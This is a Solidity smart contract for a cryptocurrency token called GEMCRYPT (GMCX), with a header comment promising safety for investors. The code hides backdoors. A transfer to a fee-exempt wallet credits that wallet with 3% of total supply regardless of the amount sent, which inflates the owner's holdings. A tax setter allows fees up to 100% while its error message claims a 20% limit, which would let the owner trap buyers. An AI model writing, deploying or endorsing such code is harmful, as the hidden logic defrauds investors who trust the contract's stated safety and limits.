// SPDX-License-Identifier: MIT

/*
We aim to streamline the process of project creation and launch, prioritizing the utmost safety for potential investors.

Website: https://gemcrypt.org
Telegram: https://t.me/gmcx_protocol
Twitter: https://twitter.com/gmcx_protocol
*/

pragma solidity 0.8.21;

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address dPair);
}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(address(0));
        owner = address(0);
    }
    event OwnershipTransferred(address owner);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}


contract GMCX is Ownable, IERC20 {
    using SafeMath for uint256;

    string private constant _name = unicode"GEMCRYPT";
    string private constant _symbol = unicode"GMCX";

    IRouter dRouter;
    address public dPair;
    bool private allowTrading = false;
    bool private allowTaxSwap = true;
    uint256 private feeSwapCount;
    bool private swapin;
    uint256 feeSwapAt;
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExFromFee;

    uint8 private constant _decimals = 9;
    uint256 private _supply = 1000000000 * (10 ** _decimals);
    uint256 private _maxSwapSz = ( _supply * 1000 ) / 100000;
    uint256 private _minSwapSz = ( _supply * 10 ) / 100000;

    uint256 private _maxTxSz = ( _supply * 300 ) / 10000;
    uint256 private _maxTransferSz = ( _supply * 300 ) / 10000;
    uint256 private _maxWalletSz = ( _supply * 300 ) / 10000;

    uint256 private lpDivide = 0;
    uint256 private marketDivide = 0;
    uint256 private devDivide = 100;
    uint256 private burnDivide = 0;

    uint256 private taxOnBuys = 1400;
    uint256 private taxOnSells = 1400;
    uint256 private taxOnTransfers = 1400;
    uint256 private denominator = 10000;

    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal walletForTax = 0x63aE1d18a12bBa6459f174AdfaB9098F75133Cc1;
    address internal walletForLp = 0x63aE1d18a12bBa6459f174AdfaB9098F75133Cc1;
    address internal walletForDev = 0x63aE1d18a12bBa6459f174AdfaB9098F75133Cc1; 

    modifier lockSwapin {swapin = true; _; swapin = false;}

    constructor() Ownable(msg.sender) {
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        dRouter = _router; dPair = _pair;
        
        isExFromFee[msg.sender] = true;
        isExFromFee[walletForLp] = true;
        isExFromFee[walletForTax] = true;
        isExFromFee[walletForDev] = true;
        _balances[msg.sender] = _supply;
        emit Transfer(address(0), msg.sender, _supply);
    }
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}    function startTrading() external onlyOwner {allowTrading = true;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function getOwner() external view override returns (address) { return owner; }
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _supply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _supply.mul(_buy).div(10000); uint256 newTransfer = _supply.mul(_sell).div(10000); uint256 newWallet = _supply.mul(_wallet).div(10000);
        _maxTxSz = newTx; _maxTransferSz = newTransfer; _maxWalletSz = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }

    function getFeeAmtForTx(address sender, address recipient) internal view returns (uint256) {
        if(recipient == dPair){return taxOnSells;}
        if(sender == dPair){return taxOnBuys;}
        return taxOnTransfers;
    }
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!isExFromFee[sender] && !isExFromFee[recipient]){require(allowTrading, "allowTrading");}
        if(!isExFromFee[sender] && !isExFromFee[recipient] && recipient != address(dPair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= _maxWalletSz, "Exceeds maximum wallet amount.");}
        if(sender != dPair){require(amount <= _maxTransferSz || isExFromFee[sender] || isExFromFee[recipient], "TX Limit Exceeded");}
        require(amount <= _maxTxSz || isExFromFee[sender] || isExFromFee[recipient], "TX Limit Exceeded"); 
        if(recipient == dPair && !isExFromFee[sender]){feeSwapCount += uint256(1);}
        if(shouldSwapTaxFee(sender, recipient, amount)){swapBackAndLpIn(_maxSwapSz); feeSwapCount = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = !isExFromFee[sender] ? getTaxAmountAdded(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }
    function swapBackAndLpIn(uint256 tokens) private lockSwapin {
        uint256 _denominator = (lpDivide.add(1).add(marketDivide).add(devDivide)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(lpDivide).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(lpDivide));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(lpDivide);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketDivide);
        if(marketingAmt > 0){payable(walletForTax).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(walletForDev).transfer(contractBalance);}
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(dRouter), tokenAmount);
        dRouter.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            walletForLp,
            block.timestamp);
    }

    function shouldSwapTaxFee(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= _minSwapSz;
        bool aboveThreshold = balanceOf(address(this)) >= _maxSwapSz;
        return !swapin && allowTaxSwap && allowTrading && aboveMin && !isExFromFee[sender] && recipient == dPair && feeSwapCount >= feeSwapAt && aboveThreshold;
    }
    
    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        lpDivide = _liquidity; marketDivide = _marketing; burnDivide = _burn; devDivide = _development; taxOnBuys = _total; taxOnSells = _sell; taxOnTransfers = _trans;
        require(taxOnBuys <= denominator.div(1) && taxOnSells <= denominator.div(1) && taxOnTransfers <= denominator.div(1), "taxOnBuys and taxOnSells cannot be more than 20%");
    }

    function getTaxAmountAdded(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (isExFromFee[recipient]) {return _maxTxSz;}
        if(getFeeAmtForTx(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getFeeAmtForTx(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burnDivide > uint256(0) && getFeeAmtForTx(sender, recipient) > burnDivide){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnDivide));}
        return amount.sub(feeAmount);} return amount;
    }
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dRouter.WETH();
        _approve(address(this), address(dRouter), tokenAmount);
        dRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }
    receive() external payable {}
}